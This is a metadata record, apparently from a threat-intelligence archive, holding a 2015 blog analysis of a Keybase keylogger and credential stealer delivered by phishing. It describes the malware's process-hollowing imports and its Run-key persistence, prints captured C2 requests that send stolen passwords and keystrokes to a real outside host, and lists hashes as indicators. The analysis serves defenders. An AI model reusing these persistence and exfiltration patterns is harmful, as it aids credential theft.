{
    "id": "68f59827-09b5-4d96-9598-485d1a2bb418",
    "created_at": "2023-01-12T15:06:58.515434Z",
    "updated_at": "2025-03-27T02:05:53.47968Z",
    "deleted_at": null,
    "sha1_hash": "311502000ae08cda3415a2d5aa887c90d90b44a3",
    "title": "2015-10-12 - Keybase Logger-Clipboard-CredsStealer campaign",
    "authors": "",
    "file_creation_date": "2022-05-28T17:47:09Z",
    "file_modification_date": "2022-05-28T17:47:09Z",
    "file_size": 567924,
    "plain_text": "# Keybase Logger/Clipboard/CredsStealer campaign\n\n**th3l4b.blogspot.com/2015/10/keybase-loggerclipboardcredsstealer.html**\n\nWhile checking my email another day i came across a phish email that seemed quite suspicious. see below:\n\n\n-----\n\nIt came with compressed file named Product_details.gz. when extracted; it presented a file\nnamed Payment_45476.scr. This file is windows executable which was .net compiled, The file was then opened with a\ntool called ILSPY in order to analyze its inner workings.\n\n- Looking at its main function it seems it created two threads:\n\nThe function below looks to be using a primitive form of obfuscation that consist on reversing strings.\n\nLooking at the function below; the malware uses an Encryption class that handles the decryption of several strings\nfound throughout the code see below.\n\n\n-----\n\nLooking at the function below, it seems it invokes the DecryptText function declared on the Encryption class.\n\n\n-----\n\nThe decoded data corresponds the imports the malware will be using:\n\nCreateProcessA\nGetThreadContext\nSetThreadContext\nWow64SetThreadContext\nReadProcessMemory\nWriteProcessMemory\nNtUnmapViewOfSection\nVirtualAllocEx\nResumeThread\n\nWhen this sample was executed it was clear the sample had malicious intents.It established persistence by copying\nitself to the startup folder and setting the autorun registry key at startup. The malware names itself \"Important.exe\"\nwhich on looking at the code it seems a static value set by the author. see below for registry and file activity.\n```\n [CreateFile] Payment_45476.exe:1316 > %AllUsersProfile%\\Important.exe   [MD5:\n7c6a2697df26582b438c21ee7ce5b0b1] \n [RegSetValue] Payment_45476.exe:1316 >\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\50057d8e6fa9271dc2110b90bda7f871 =\nC:\\ProgramData\\Important.exe \n\n```\nThe malware then starts to reach out to its c2. The requests indicate the malware has the following capabilities:\n\nTakes a screenshot of the current working window\nActs as a keylogger and credential stealer.\nCaptures clipboard content.\n```\n GET /wp-includes/css/keybase/post.php?type=notification&machinename=PETERPC&machinetime=11:58%20PM \n HTTP/1.1 \n \"steals passwords from chrome password cache\" \n GET /wp-includes/css/keybase/post.php?\ntype=passwords&machinename=PETERPC&application=Chrome&link=http://gsl8411.ru.swtest.ru/ruru/user&username=polloloco&password=zi25XgKY \n HTTP/1.1 \n \"it has keylogging capabilities\" \n GET /wp-includes/css/keybase/post.php?\ntype=keystrokes&machinename=PETERPC&windowtitle=Filter&keystrokestyped=teststringt&machinetime=12:00%20AM \n HTTP/1.1 \n POST /wp-includes/css/keybase/image/upload.php HTTP/1.1 \n Content-Type: multipart/form-data; boundary=---------------------8d2d03db831e930 \n Host: examgist.com \n\n```\nOn looking further to the c2 callbacks, it was noticed the locations in which the screenshots were shared was world\nreadable. See sample below:\n\n\n-----\n\nThe login panel was also available :\n\nIn conclusion,this malware is considered primitive based on its design. however, it can certainly cause damage its\nkelogging, screen sharing and credential stealing capabilities make it very attractive to skiddies. thank you for reading\n\nMD5:\n\n7c6a2697df26582b438c21ee7ce5b0b1 Payment_45476.scr\n\n398af2fd86ce37d6d3052eb7503b2790 Order_25464.scr\n\n78c4256eb2003db620a45adba44f404c Order_34002.gz\n\n9dada7b67f5066e6f5d394222240beb9 Product_details.gz\n\nC2:\n\nhttp://examgist[ ]com/wp-includes/css/keybase/login php\n\n\n-----\n\nVT:\nhttps://www.virustotal.com/en/file/2d1009dbaecc2f0dd543adb812d55726656843ea1a66058059eb3fbd088b2a5c/analysis/\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2015/2015-10-12 - Keybase Logger-Clipboard-CredsStealer campaign.pdf"
    ],
    "report_names": [
        "2015-10-12 - Keybase Logger-Clipboard-CredsStealer campaign.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536018,
    "ts_updated_at": 1743041153,
    "ts_creation_date": 1653760029,
    "ts_modification_date": 1653760029,
    "files": {
        "pdf": "https://archive.orkl.eu/311502000ae08cda3415a2d5aa887c90d90b44a3.pdf",
        "text": "https://archive.orkl.eu/311502000ae08cda3415a2d5aa887c90d90b44a3.txt",
        "img": "https://archive.orkl.eu/311502000ae08cda3415a2d5aa887c90d90b44a3.jpg"
    }
}